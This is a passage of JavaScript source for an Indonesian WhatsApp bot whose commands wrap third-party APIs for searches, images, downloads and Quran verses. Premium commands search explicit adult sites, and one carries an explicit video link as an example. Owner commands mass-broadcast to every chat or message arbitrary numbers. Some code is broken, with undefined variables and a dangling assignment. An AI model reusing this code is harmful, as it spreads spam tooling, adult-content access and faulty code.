                    ini_txt += `English : ${get_result.title.english}\n`
                    ini_txt += `Native : ${get_result.title.native}\n`
                    ini_txt += `Format : ${get_result.format}\n`
                    ini_txt += `Episodes : ${get_result.episodes}\n`
                    ini_txt += `Duration : ${get_result.duration} mins.\n`
                    ini_txt += `Status : ${get_result.status}\n`
                    ini_txt += `Season : ${get_result.season}\n`
                    ini_txt += `Season Year : ${get_result.seasonYear}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
                    ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
                    ini_txt += `Genre : ${get_result.genres.join(', ')}\n`
                    ini_txt += `Synonyms : ${get_result.synonyms.join(', ')}\n`
                    ini_txt += `Score : ${get_result.averageScore}%\n`
                    ini_txt += `Characters : \n`
                    ini_character = get_result.characters.nodes
                    for (var x of ini_character) {
                        ini_txt += `- ${x.name.full} (${x.name.native})\n`
                    }
                    ini_txt += `\nDescription : ${get_result.description}`
                    thumbnail = await getBuffer(get_result.coverImage.large)
                    await arifi.sendMessage(from, thumbnail, image, { quoted: rojak, caption: ini_txt })
                    limitAdd(sender, limit)
                    break  
                    case 'google': 
                   if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/gsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = 'Google Search : \n'
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Desc : ${x.desc}\n\n`
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break
                case 'stickerwa': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} Koceng Imot`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/stickerwa?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result[0].stickers
                    for (var x of get_result) {
                        ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${x}`)
                        await arifi.sendMessage(from, ini_buffer, sticker)
                    }
                    limitAdd(sender, limit)
                    break 
                       case 'gimage': 
                      if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(' ')
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/gimage?apikey=${lolkey}&query=${query}`)
                    await arifi.sendMessage(from, ini_buffer, image, { quoted: rojak })
                 limitAdd(sender, limit)
                       break
                case 'gimage2': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/gimage2?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    for (var x = 0; x <= 5; x++) {
                        var ini_buffer = await getBuffer(get_result[x])
                        await arifi.sendMessage(from, ini_buffer, image)
                    }
                   limitAdd(sender, limit)
                     break
                case 'konachan': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} azur_lane`)
                    query = args.join(' ')
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/konachan?apikey=${lolkey}&query=${query}`)
                    await arifi.sendMessage(from, ini_buffer, image, { quoted: rojak })
                 limitAdd(sender, limit)
                       break
                case 'wallpapersearch': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=${lolkey}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    await arifi.sendMessage(from, ini_buffer, image, { quoted: rojak })
                  limitAdd(sender, limit)
                    break
                case 'wallpapersearch2':
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper2?apikey=${lolkeyy}&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    await arifi.sendMessage(from, ini_buffer, image, { quoted: rojak })
                  limitAdd(sender, limit)
                      break 
                    case 'tiktok':
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
                case 'bannerlol':
                //[❗] case by DappaGanz 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                try {
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}|ganz`)
                ct = args.join(' ')
                dap1 = ct.split('|')[0]
                dap2 = ct.split('|')[1]
                reply(mess.wait)
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lolkey}&text1=${dap1}&text2=${dap2}`)
                arifi.sendMessage(from, dapuhy, image, {quoted: rojak})
                } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error)
				}
                limitAdd(sender, limit)
                break    
                 case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':  
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                try { 
                if (args.length == 0) return reply(`Example: ${prefix + command} ${pushname}|ganz`)                    
                ct = args.join(' ')
                dap1 = ct.split('|')[0]
                dap2 = ct.split('|')[1]
                reply(mess.wait)
                dapuhy = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${lolkey}&text1=${dap1}&text2=${dap2}`)
                arifi.sendMessage(from, dapuhy, image, {quoted: rojak})
                } catch (e) {
				console.log(`Error :`, color(e,'red'))
				reply(mess.error)
				} 
				limitAdd(sender, limit)
				break  
				case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                case 'cartoongravity':
                case 'anonymhacker':
                if (isBanned) return reply(mess.baned)
                if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                ojan = args.join(' ')
                reply(mess.wait)
                ojan = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ojan}`)
                arifi.sendMessage(from, ojan, image, {quoted: rojak})
                await limitAdd(sender)
                break
				case 'matrix': 
if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
buffer = await getBuffer(`https://api.zeks.xyz/api/matrix?apikey=${zeksapi}&text=${body.slice(8)}`)
arifi.sendMessage(from, buffer, image, {quoted: floc})
limitAdd(sender, limit)
break
case 'text3dbox': 
if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
buffer = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=${zeksapi}&text=${body.slice(11)}`)
arifi.sendMessage(from, buffer, image, {quoted: floc, caption: 'Nih'})
limitAdd(sender, limit)
break
case 'text3d': 
if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
buffer = await getBuffer(`https://api.zeks.xyz/api/text3d?text=${body.slice(8)}&apikey=${zeksapi}`)
arifi.sendMessage(from, buffer, image, {quoted: floc, caption: 'Nih'})
limitAdd(sender, limit)
break
case 'leavestext': 
if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
buffer = await getBuffer(`https://api.zeks.xyz/api/leavest?text=${body.slice(12)}&apikey=${zeksapi}`)
arifi.sendMessage(from, buffer, image, {quoted: floc, caption: 'Nih'})
limitAdd(sender, limit)
break
case 'textlight': 
if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
if (args.length < 1) return reply(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
buffer = await getBuffer(`https://api.zeks.xyz/api/tlight?text=${body.slice(11)}&apikey=${zeksapi}`)
arifi.sendMessage(from, buffer, image, {quoted: floc, caption: 'Nih'})
limitAdd(sender, limit)
break
				case 'ttp':
                case 'ttp2':
                case 'ttp3':
                case 'ttp4':
                case 'attp': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(' ')
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=${lolkey}&text=${ini_txt}`)
                    await arifi.sendMessage(from, ini_buffer, sticker, { quoted: rojak})
                    limitAdd(sender, limit)
                    break   
                    case 'tahta':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
if (!isGroup) return reply(mess.only.group)
if (args.length < 1) return reply('*Teks nya mana?*')
reply(mess.wait)
tahta = args.join(' ')
tahta = await getBuffer(`https://api.zeks.xyz/api/hartatahta?apikey=${zeksapi}&text=${tahta}`)
arifi.sendMessage(from,tahta,image,{quoted:rojak})
limitAdd(sender, limit)
break
                    				
                    case 'getpict':
				case 'getpic': 
		  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
					if (!isGroup) return reply(mess.only.group)
            mentioned = rojak.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await arifi.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            arifi.sendMessage(from, pict, image, {quoted: rojak})
            limitAdd(sender, limit)
            break
				case 'chat': 
				  if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split('|')[0];
            var org = pc.split('|')[1];
            arifi.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            limitAdd(sender, limit)
            break  
            
        case 'xhamstersearch': 
        if (!isPremium) return reply(mess.only.prem)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xhamstersearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ''
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n\n`
                    }
                    reply(ini_txt)
                    limitAdd(sender, limit)
                    break    
                    case 'zippyshare':
    case 'zipp':
        if (!isPremium) return reply(mess.only.prem)
                    if (args.length == 0) return reply(`Example: ${prefix + command} url`)
                    ini_url = args[0]
                    Op = await ZippDL(ini_url)
                    console.log(Op)
                    Op = Op.result
                    result =`╭───「 *ZIPPYSHARE DOWNLOAD* 」
│
├ *Data Berhasil Didapatkan!*
│
├≽ Nama : ${Op.title}
├≽ Ukuran : ${Op.size}
├≽ Upload : ${Op.upload}
├≽ Type : ${Op.filetype}
├≽ Link : ${Op.url}
│
╰─────────────────────
_*Tunggu Proses Mengirim Media......*_`
                    fakegroup(result)
                    buffnya = await getBuffer(`${Op.url}`)
                    arifi.sendMessage(from, buffnya, document, { mimetype: `${Op.filetype}`  , filename: `${Op.title}`})
                break
              case 'fire': 
if (!isPremium) return reply(mess.only.prem)
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `Media Fire Downloader
_*Tunggu Proses Mengirim Media......*_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: rojak})
break 

case 'mediafire': 
if (!isPremium) return reply(mess.only.prem)
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.Iv)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `Media Fire Downloader

*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}
*Link :* ${res[0].link}

_*Tunggu Proses Mengirim Media......*_`
sendButMessage(from, result, `Silahkan Click Next Untuk Melanjutkan Nya`, [
            {              
              buttonId: `${prefix}fire ${teks}`,
              buttonText: {
                displayText: `🖨️DOWNLOAD`,
              },
              type: 1,
            },
          ]);        
        break;           
                        case 'nhentai':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 344253`)
                    henid = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolkey}`)
                    get_result = get_result.result
                    ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
                    ini_txt += `Title Native : ${get_result.title_native}\n`
                    ini_txt += `Read Online : ${get_result.read}\n`
                    get_info = get_result.info
                    ini_txt += `Parodies : ${get_info.parodies}\n`
                    ini_txt += `Character : ${get_info.characters.join(', ')}\n`
                    ini_txt += `Tags : ${get_info.tags.join(', ')}\n`
                    ini_txt += `Artist : ${get_info.artists}\n`
                    ini_txt += `Group : ${get_info.groups}\n`
                    ini_txt += `Languager : ${get_info.languages.join(', ')}\n`
                    ini_txt += `Categories : ${get_info.categories}\n`
                    ini_txt += `Pages : ${get_info.pages}\n`
                    ini_txt += `Uploaded : ${get_info.uploaded}\n`
                    sendButMessage(from, ini_txt, `Silahkan Click Next Untuk Melanjutkan Nya`, [
            {              
              buttonId: `${prefix}nhdl ${henid}`,
              buttonText: {
                displayText: `📒DOWNLOAD PDF`,
              },
              type: 1,
            },
          ]);        
        break;           
                     case 'nhentaipdf':
          case 'nhdl':
              if (!isPremium) return reply(mess.only.prem)
              reply('Please wait, data is being processed')
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${q}?apikey=${lolkey}`)
              ini_image = await getBuffer(get_result.result.image[0])
              data = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${q}?apikey=${lolkey}`)
              pdf = await getBuffer(data.result)
              arifi.sendMessage(from, pdf, document, { quoted: rojak, mimetype: Mimetype.pdf, filename: `${get_result.result.title_romaji}.pdf`, thumbnail: ini_image })
              break
               
                case 'xnxxsearch': 
                if (!isPremium) return reply(mess.only.prem)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Japanese`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxxsearch?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ''
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Uploader : ${x.uploader}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'xnxx': 
                if (!isPremium) return reply(mess.only.prem)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/xnxx?apikey=${lolkey}&url=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `View : ${get_result.view}\n`
                    ini_txt += `Rating : ${get_result.rating}\n`
                    ini_txt += `Like : ${get_result.like}\n`
                    ini_txt += `Dislike : ${get_result.dislike}\n`
                    ini_txt += `Comment : ${get_result.comment}\n`
                    ini_txt += `Tag : ${get_result.tag.join(', ')}\n`
                    ini_txt += `Description : ${get_result.description}\n`
                    ini_txt += 'Link : \n'
                    ini_link = get_result.link
                    for (var x of ini_link) {
                        ini_txt += `${x.type} - ${x.link}\n\n`
                    }
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await arifi.sendMessage(from, thumbnail, image, { quoted: ftroli, caption: ini_txt })
                    break 
                     case 'wikiped': 
                    if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                    if (args.length == 0) return reply(`Example: ${prefix + command} Tahu`)
                    query = args.join(' ')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wiki?apikey=${lolkey}&query=${query}`)
                    get_result = get_result.result
                    reply(get_result)
                    limitAdd(sender, limit)
                    break
      case 'id78':
        var gh = args.join('');
        var link = gh.split('|')[0];
        var tipe = gh.split('|')[1];
        var bv = await fetchJson(
          `https://dhn-api.herokuapp.com/downloader/tiktok/nowatermark?url=${link}&apikey=${dhkey}`
        );
        if (tipe == 'audio') {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, '');
        }
        if (tipe == 'video') {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, '');
        }
        break;
     case 'ytdl':
        var gh = args.join('');
        var link = gh.split('|')[0];
        var tipe = gh.split('|')[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/${tipe}?url=${link}&apikey=${dhkey}`
        );
        if (tipe == 'video') {
          sendMediaURL(from, bv.result.media_resources.videoUrl, '');
        }
        if (tipe == 'music') {
          sendMediaURL(from, bv.result.media_resources.musicUrl, '');
        }
        break;

      case 'id12':
        if (!rojak.key.fromMe) return;
        if (prefixStatus == false) return reply('No prefix is recently on!');
        prefixStatus = false;
        reply('Berhasil mengganti prefix menjadi noprefix');
        break;
      case 'id13':
        if (!rojak.key.fromMe) return;
        if (prefixStatus == true) return reply('Multi prefix is recently on!');
        prefixStatus = true;
        reply('Berhasil mengganti prefix menjadi multiprefix');
        break;

      case 'delvote':
        if (!rojak.key.remoteJid) return;
        if (isVote) return reply('Tidak ada sesi Voting');
        delVote(from);
        reply('Sukses Menghapus sesi Voting Di Grup Ini');
        break;   
        case 'addvn':
					if (!isOwner && !rojak.key.fromMe) return reply(mess.only.ownerB)
					if (!isQuotedAudio) return reply('Reply audio')
					nm = body.slice(7)
					if (!nm) return reply('Nama vn nya apa?')
					boij = JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await arifi.downloadMediaMessage(boij)
					vien.push(`${nm}`)
					fs.writeFileSync(`./media/vn/${nm}.mp3`, delb)
					fs.writeFileSync('./database/vien.json', JSON.stringify(vien))
					arifi.sendMessage(from, `Sukses, silahkan cek dengan *${prefix}listvn*`, MessageType.text, { quoted: rojak })
					break
					case 'delvn':
					if (!isOwner && !rojak.key.fromMe) return reply(mess.only.ownerB)
					try {
					 nmm = body.slice(7)
					 wanu = vien.indexOf(nmm)
					 vien.splice(wanu, 1)
					 fs.unlinkSync(`./media/vn/${nmm}.mp3`)
					reply(`Sukses menghapus vn ${body.slice(7)}`)
					} catch (err){
						console.log(err)
						reply(mess.error.api)
					}
					break

				case 'vnlist':
				case 'listvn': {
					let teksgs = '*VN List :*\n\n'
					for (let awokwkwk of vien) {
						teksgs += `- ${awokwkwk}\n`
					}
					teksgs += `\n*Total : ${vien.length}*\n\n_Untuk mengambil vn silahkan reply pesan ini dengan caption nama vn_`
					arifi.sendMessage(
					   from, 
					   teksgs.trim(), 
					   extendedText, { 
					      quoted: rojak, 
					      contextInfo: { 
					         mentionedJid: vien 
					         } 
					    })
					}
					break;
					
					case 'slowmo':
				encmedia = JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await arifi.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a 'atempo=0.7,asetrate=44100' ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				arifi.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: rojak})
				fs.unlinkSync(ran)
				})
				break

        case 'detikvn':
encmediam = JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await arifi.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						arifi.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:rojak})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await arifi.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						arifi.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: rojak})
						fs.unlinkSync(median)
				break
				case 'bcnowm': 
        if (!isOwner) return reply(mess.only.owner)
if (!q)return reply(`Reply image , video , atau teks biasa dan Masukan Ingfo`)
bcc = await arifi.chats.all()
if (isMedia && !rojak.message.imageMessage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : rojak
let media = await arifi.downloadMediaMessage(encmedia)
for (let i of bcc){
arifi.sendMessage(i.jid, media, image, {contextInfo: { forwardingScore: 9999, isForwarded:true},caption: `${q}`})
}
reply(`Sukses`)
} else if (isMedia && !rojak.message.videoMessage || isQuotedVideo) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mem).replace('quotedM','m')).message.extendedTextMessage.contextInfo : rojak
bc = await arifi.downloadMediaMessage(encmedia)
for (let _ of bcc) {
arifi.sendMessage(_.jid, bc, video, {caption: `${q}`})
}
reply('Suksess broadcast')
}	else {
for (let _ of bcc) {
sendMess(_.jid, `${q}`)
	}
reply(`Succses BroadCast ${totalchat.length} Total chat`)
		}
break			   
         case 'bc': 
        if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
if (!q)return reply(`Reply image , video , atau teks biasa dan Masukan Ingfo`)
bcc = await arifi.chats.all()
if (isMedia && !rojak.message.imageMessage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(rojak).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : rojak
let media = await arifi.downloadMediaMessage(encmedia)
for (let i of bcc){
arifi.sendMessage(i.jid, media, image, {contextInfo: { forwardingScore: 9999, isForwarded:true},caption: `*「BROADCAST 」*\n\n${q}`})
}
reply(`Sukses`)
} else if (isMedia && !rojak.message.videoMessage || isQuotedVideo) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mem).replace('quotedM','m')).message.extendedTextMessage.contextInfo : rojak
bc = await arifi.downloadMediaMessage(encmedia)
for (let _ of bcc) {
arifi.sendMessage(_.jid, bc, video, {caption: `*「BROADCAST 」*\n\n${q}`})
}
reply('Suksess broadcast')
}	else {
for (let _ of bcc) {
sendMess(_.jid, `*「BROADCAST 」*\n\n${q}`)
	}
reply(`Succses BroadCast ${totalchat.length} Total chat`)
		}
break
			   
                case 'bcstik':					 
                 if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
				anu = await arifi.chats.all()
				if (isMedia && !rojak.message.videoMessage || isQuotedSticker) {
				let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo : rojak
				bc = await arifi.downloadMediaMessage(encmedia)
				for (let _ of anu) {
				arifi.sendMessage(_.jid, bc, sticker, {quoted:ftroli})
				}
		    	reply('Suksess broadcast')
				}
				break
                case 'bcvideo':				 
                if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
				if (args.length < 1) return reply('.......')
				anu = await dp.chats.all()
		    	if (isMedia && !dap.message.videoMessage || isQuotedVideo) {
				let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo : rojak
				bc = await arifi.downloadMediaMessage(encmedia)
				for (let _ of anu) {
				arifi.sendMessage(_.jid, bc, video, {mimetype: 'video/mp4', duration: 359996400,quoted: ftroli,caption: `[ *BROADCAST* ]\n\n${body.slice(9)}`})
				}
				reply('Suksess broadcast')
				}
				break
             	case 'bcaudio':				 				
             	if (!isOwner && !rojak.key.fromMe) return reply(mess.only.owner)
				anu = await arifi.chats.all()
				if (isMedia && !rojak.message.audioMessage || isQuotedAudio) {
				let encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(rojak).replace('quotedM','m')).message.extendedTextMessage.contextInfo : rojak
				bc = await arifi.downloadMediaMessage(encmedia)
				for (let _ of anu) {
				arifi.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftroli,caption: `[ *BROADCAST* ]\n\n${body.slice(9)}`})
				}
				reply('Suksess broadcast')
				}
				break 
				
				/*case 'quran': 
				if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (args.length < 1) return reply(`surah keberapa bang?\ncontoh : ${prefix + command} 6`)
				reply(mess.wait)
				surah = args.join(' ')
				qur = await fetchJson(`https://api.lolhuman.xyz/api/quran/${surah}?apikey=${lolkey}`)
				an = qur.result
				suara = await getBuffer(an.audio)
				 = `Nomor : ${an.nomor}\nAsma : ${an.asma}\nSurah : ${an.surah}\nJumlah Ayat : ${an.jumlah_ayat}\nDiturunkan Di : ${an.type}\nKeterangan : ${an.keterangan}`
				teks = '=================\n'
				for (let i of qur.result.ayat) {
				teks += `Ayat : ${i.ayat}\nArab : ${i.arab}\nIndonesia : ${i.indonesia}\nLatin : ${i.latin}\n=================\n`
				}
                arifi.sendMessage(from, halal, text, {quoted: ftroli})
                reply(teks.trim())
                arifi.sendMessage(from, suara, audio, {mimetype: 'audio/mp3', filename: `${an.surah}.mp3`, quoted: ftroli})
                limitAdd(sender, limit)
                break*/
                case 'ayat': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`ayat keberapa bang?\ncontoh : ${prefix + command} 4/6`)
				reply(mess.wait)
				ct = args.join(' ')
				dap1 = ct.split('/')[0]
                dap2 = ct.split('/')[1]
				biss = await fetchJson(`https://api.lolhuman.xyz/api/quran/${dap1}/${dap2}?apikey=${lolkey}`)
				millah = biss.result
				halal = `Nomor : ${millah.nomor}\nAsma : ${millah.asma}\nSurah : ${millah.surah}\nJumlah Ayat : ${millah.jumlah_ayat}\nDiturunkan Di : ${millah.type}\nKeterangan : ${millah.keterangan}`
				teks = '=================\n'
				for (let i of biss.result.ayat) {
				teks += `Ayat : ${i.ayat}\nArab : ${i.arab}\nIndonesia : ${i.indonesia}\nLatin : ${i.latin}\n=================\n`
				suara = await getBuffer(i.audio)
				arifi.sendMessage(from, suara, audio, {mimetype: 'audio/mp3', filename: `${millah.surah}.mp3`, quoted: ftroli})
				}
                arifi.sendMessage(from, halal, text, {quoted: ftroli})
                reply(teks.trim())
                limitAdd(sender, limit)
                break
                case 'ayat2': 
               if (isBanned) return reply(mess.baned)
   if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit) 
                if (args.length < 1) return reply(`ayat keberapa bang?\ncontoh : ${prefix + command} 4/1-6`)
				reply(mess.wait)
				ct = args.join(' ')
				dap1 = ct.split('/')[0]
                dap2 = ct.split('/')[1]
				biss = await fetchJson(`https://api.lolhuman.xyz/api/quran/${dap1}/${dap2}?apikey=${lolkey}`)
				millah = biss.result
				halal = `Nomor : ${millah.nomor}\nAsma : ${millah.asma}\nSurah : ${millah.surah}\nJumlah Ayat : ${millah.jumlah_ayat}\nDiturunkan Di : ${millah.type}\nKeterangan : ${millah.keterangan}`
				teks = '=================\n'
				for (let i of biss.result.ayat) {
